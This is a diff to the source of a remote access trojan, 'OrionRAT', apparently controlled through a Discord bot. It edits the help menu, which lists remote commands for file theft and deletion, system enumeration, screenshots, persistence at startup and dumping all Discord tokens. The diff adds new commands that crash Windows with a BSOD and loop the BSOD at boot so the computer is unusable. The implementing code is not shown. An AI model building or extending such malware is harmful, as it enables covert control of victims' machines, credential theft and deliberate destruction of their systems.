@@ -44,7 +44,7 @@ async def help(ctx):
     help_text = r"""```ansi
 [2;31m[ [0mOrionRAT [2;31m][0m - [2;31m[[0m V1 [2;31m]
 
-[2;31mPrefix[0m  [2;32m$[0m
+[2;31mPrefix[0m > [2;32m$[0m
 
 [2;31m[[0m pwd [2;31m][0m  Show current directory
 [2;31m[[0m rm [2;31m][0m  Deletes a single file
@@ -55,9 +55,9 @@ async def help(ctx):
 [2;31m[[0m whoami [2;31m][0m  Show current user
 [2;31m[[0m upload <attachment>[2;31m][0m  Upload a file
 [2;31m[[0m download <path [2;31m][0m  Download a file
-[2;31m[[0m enum [2;31m][0m  Send system & networking information 
+[2;31m[[0m enum [2;31m][0m  Sends system & networking information 
 [2;31m[[0m ss [2;31m][0m  Take screenshot
-[2;31m[[0m notf <text [2;31m][0m  Send a notification
+[2;31m[[0m notf <text [2;31m][0m  Sends a notification (L)
 [2;31m[[0m restart [2;31m][0m  Restart system
 [2;31m[[0m shutdown [2;31m][0m  Shutdown system
 [2;31m[[0m kill <process [2;31m][0m  Kill a process
@@ -65,7 +65,10 @@ async def help(ctx):
 [2;31m[[0m add_startup <name [2;31m][0m  Add to startup
 [2;31m[[0m hello [2;31m][0m  Greet
 [2;31m[[0m steak [2;31m][0m  Try it.
-[2;31m[[0m gettoken [2;31m][0m  Dump all discord tokens. 
+[2;31m[[0m gettoken [2;31m][0m  Dump all discord tokens. (W)
+[2;31m[[0m bsod [2;31m][0m  Crashes windows causing a BSOD. (W)
+[2;31m[[0m bsodloop [2;31m][0m  Makes the computer unusable by looping at boot the BSOD. (W)
+
 ```"""
 
     await ctx.send(help_text)
